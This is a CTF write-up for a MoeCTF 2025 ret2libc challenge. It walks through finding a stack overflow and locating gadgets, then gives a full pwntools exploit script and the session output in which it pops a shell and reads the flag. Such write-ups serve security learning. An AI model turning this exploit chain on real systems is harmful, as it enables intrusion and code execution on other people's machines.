---
title: 'XiDianCTF MoeCTF 2025 PWN 3 Recognizing libc'
date: '2026-09-03T21:06:05+08:00'
lastmod: '2026-09-03T21:06:05+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "PWN"
---

```
The original Chinese article was written by a human and only proofread with generative AI. This English version was translated with AI.
```

[Challenge link](https://ctf.xidian.edu.cn/training/22?challenge=928)

According to the challenge hint, this is a ret2libc challenge.[^CTF Wiki]

Once again, open the binary in IDA.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  puts("The Oracle speaks...");
  puts("There is no system function in the .text segment.");
  printf("A gift of forbidden knowledge, the location of 'printf': %p\n", &printf);
  vuln();
  return 0;
}
```

```c
ssize_t vuln()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("\nNow, show me what you can do with this knowledge:");
  printf("> ");
  return read(0, buf, 0x100uLL);
}
```



The program leaks the address of `printf`, and we are also given `libc.so.6`. This allows us to calculate the base address of libc and then add the required offsets.

However, neither `system` nor the string `"/bin/sh"` appears to exist in the binary itself.

Therefore, we need to obtain both of them from libc.

> Under the **System V AMD64 ABI**, `system` takes a single argument, which is passed in the `RDI` register. Therefore, before jumping to `system`, we need to place the address of the string in `RDI`.
>
> We can use `POP RDI` to load an address from the stack into `RDI`.
>
> We need to find a gadget with the following instructions:
>
> > POP RDI
> >
> > RET
>
> We then construct the overflow so that the stack contains:
>
> > `system` address
> >
> > String address
> >
> > Gadget address
>
> The entire process can be completed with a single chain—elegant and extremely cool.



Unfortunately, we could not find that exact sequence.

```assembly
 5F      pop     rdi
 C3      retn
```

But we did find this:

```assembly
.text:000000000002A3E4 41 5F     pop     r15
.text:000000000002A3E6 C3        retn
```

Starting one byte into the first instruction works as well.



Now we can begin constructing the stack overflow.

```assembly
.text:0000000000401215                 call    printf
.text:000000000040121A                 lea     rax, [rbp+buf]
.text:000000000040121E                 mov     edx, 100h       ; nbytes
.text:0000000000401223                 mov     rsi, rax        ; buf
.text:0000000000401226                 mov     edi, 0          ; fd
.text:000000000040122B                 call    _read
.text:0000000000401230                 nop
.text:0000000000401231                 leave
.text:0000000000401232                 retn
```

The address of `buf` is stored in the `RSI` register.

Set a breakpoint in GDB and inspect the registers.

```
GNU gdb (Ubuntu 15.1-1ubuntu1~24.04.1) 15.1
...
(gdb) b *0x401226
Breakpoint 1 at 0x401226
(gdb) r
Starting program: /mnt/path/to/pwn
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
The Oracle speaks...
There is no system function in the .text segment.
A gift of forbidden knowledge, the location of 'printf': 0x7ffff7c60100

Now, show me what you can do with this knowledge:
>
Breakpoint 1, 0x0000000000401226 in vuln ()
(gdb) info registers
rax            0x7fffffffd7b0      140737488345008
rbx            0x7fffffffd928      140737488345384
rcx            0x0                 0
rdx            0x100               256
rsi            0x7fffffffd7b0      140737488345008
rdi            0x7fffffffd5d0      140737488344528
rbp            0x7fffffffd7f0      0x7fffffffd7f0
rsp            0x7fffffffd7b0      0x7fffffffd7b0
...
```

The address of `buf` is `0x7fffffffd7b0`.

The stack frame base, `rbp`, is at `0x7fffffffd7f0`.

Therefore, the distance from `buf` to the saved return address is `0xf0 - 0xb0 + 0x8 = 0x48`, or 72 bytes.



pwntools script:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

io = connect("127.0.0.1", 11997)

io.recvuntil(b'\'printf\':')

data = int(io.recv(16), 16)

print(hex(data))
print((data))

baseAdd = data - 0x606f0

gadgetAdd = baseAdd + 0x2a3e5
stringAdd = baseAdd + 0x1d8678
systemAdd = baseAdd + 0x50d70

retAdd = baseAdd + 0xc6c2f

io.send(b'A' * 72 + p64(gadgetAdd) + p64(stringAdd) + p64(retAdd) + p64(systemAdd))

io.interactive()

```

> Here, the gadget executes an extra `ret` without a corresponding `call`, leaving `rsp` misaligned with respect to the required 16-byte stack alignment.
>
> Therefore, we need one additional `ret` gadget to restore alignment.

```
[x] Opening connection to 127.0.0.1 on port 11997
[x] Opening connection to 127.0.0.1 on port 11997: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 11997: Done
[DEBUG] Received 0x14 bytes:
    b'The Oracle speaks...'
[DEBUG] Received 0xb0 bytes:
    b'\n'
    b'There is no system function in the .text segment.\n'
    b"A gift of forbidden knowledge, the location of 'printf': 0x7feccf7716f0\n"
    b'\n'
    b'Now, show me what you can do with this knowledge:\n'
    b'> '
0x7feccf7716f0
140655069697776
[DEBUG] Sent 0x68 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  e5 b3 73 cf  ec 7f 00 00  │AAAA│AAAA│··s·│····│
    00000050  78 96 8e cf  ec 7f 00 00  2f 7c 7d cf  ec 7f 00 00  │x···│····│/|}·│····│
    00000060  70 1d 76 cf  ec 7f 00 00                            │p·v·│····│
    00000068
[*] Switching to interactive mode

Now, show me what you can do with this knowledge:
> ls

[DEBUG] Sent ...
[DEBUG] Received ...

bin
flag
lib
lib32
lib64
libexec
libx32
pwn

cat flag
[DEBUG] Sent ...
[DEBUG] Received ...
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 11997
```











[^CTF Wiki]:[ret2libc](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc)
